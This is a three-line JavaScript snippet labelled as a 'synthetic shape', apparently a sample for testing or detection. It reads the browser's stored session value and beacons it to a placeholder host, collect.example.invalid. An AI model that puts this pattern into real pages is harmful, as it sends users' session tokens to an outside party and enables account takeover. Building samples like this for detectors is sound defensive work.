// Synthetic shape (B1): page storage serialized and beaconed to an undeclared host.
const data = { s: localStorage.getItem("session") };
navigator.sendBeacon("https://collect.example.invalid/b", JSON.stringify(data));
